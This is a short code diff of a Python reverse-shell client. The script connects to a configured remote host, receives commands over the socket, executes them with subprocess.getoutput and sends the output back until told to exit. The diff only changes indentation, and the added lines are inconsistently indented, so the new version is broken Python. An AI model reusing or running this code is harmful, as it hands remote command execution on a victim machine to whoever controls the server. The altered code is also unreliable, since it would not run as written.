@@ -8,9 +8,9 @@ s.connect((SERVER_HOST, SERVER_PORT))
 message = s.recv(BUFFER_SIZE).decode()
 print("Server:", message)
 while True:
-	command = s.recv(BUFFER_SIZE).decode()
-	if command.lower() == "exit":
-		break
-	output = subprocess.getoutput(command)
-	s.send(output.encode())
+  command = s.recv(BUFFER_SIZE).decode()
+    if command.lower() == "exit":
+      break
+  output = subprocess.getoutput(command)
+  s.send(output.encode())
 s.close()
